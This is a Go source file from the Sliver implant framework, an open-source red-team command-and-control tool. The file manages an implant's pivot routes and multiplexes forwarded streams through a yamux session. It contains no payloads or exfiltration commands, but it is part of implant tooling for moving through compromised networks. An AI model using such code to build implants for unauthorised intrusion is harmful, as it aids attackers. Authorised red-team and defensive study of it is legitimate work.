package route

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"log"
	"net"
	"sync"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
)

var (
	// Routes - All active network routes.
	Routes = &routes{
		Active: map[uint32]*sliverpb.Route{},
		mutex:  &sync.Mutex{},
	}
)

// routes - Holds all routes in which this implant is a node.
type routes struct {
	Active map[uint32]*sliverpb.Route
	mutex  *sync.Mutex
	Server *bon.Bon
}

// Add - The implant has received a route request from the server.
// TODO: If we have only len(Chain.Nodes) == 1, this means the last node
// is a subnet, not a further node in the chain. Therefore we register
// the special handler for net.Dial.
func (r *routes) Add(new *sliverpb.Route) (*sliverpb.Route, error) {
	r.mutex.Lock()
	r.Active[new.ID] = new
	r.mutex.Unlock()
	return new, nil
}

// Remove - The implant has been ordered to stop routing traffic to a certain route.
// We do not accept further streams for this one, and deregister it.
func (r *routes) Remove(routeID uint32) (err error) {
	r.mutex.Lock()
	delete(r.Active, routeID)
	r.mutex.Unlock()
	return
}

// router - Responsible for routing all streams muxed out of of a physical connection.
// This router is being passed various objects drawned from transports, etc.
// This object also wraps the multiplexer so as to be compatible with the Bon router object.
type router struct {
	session *yamux.Session
}

// SetupMuxRouter - When the first route is registered, we register a mux router.
// After this call, the implant is able to route traffic that is being forwarded
// by the previous node in the chain (server -> pivot -> this implant).
func SetupMuxRouter(mux *yamux.Session) (router *bon.Bon) {
	// {{if .Config.Debug}}
	log.Printf("Starting mux stream router")
	// {{end}}

	r := newRouter(mux)
	router = bon.New(r)

	// We don't set default (non-matching) handlers,
	// because no connection should arrive to the router
	// without a defined route ID.

	return
}

func newRouter(mux *yamux.Session) *router {
	return &router{session: mux}
}

// Accept - The router is able to accept a new muxed stream.
func (s *router) Accept() (net.Conn, error) {
	// {{if .Config.Debug}}
	log.Printf("[route] accepting new stream")
	// {{end}}
	return s.session.Accept()
}

// Open - The router is able to open a new stream so as to
// forward the connection that we want to route, with a Route r.
func (s *router) Open(r bon.Route) (net.Conn, error) {
	// {{if .Config.Debug}}
	log.Printf("[route] routing newly accepted stream")
	// {{end}}
	return s.session.Open()
}

// Close - The router can close the multiplexer session.
func (s *router) Close() error {
	return s.session.Close()
}
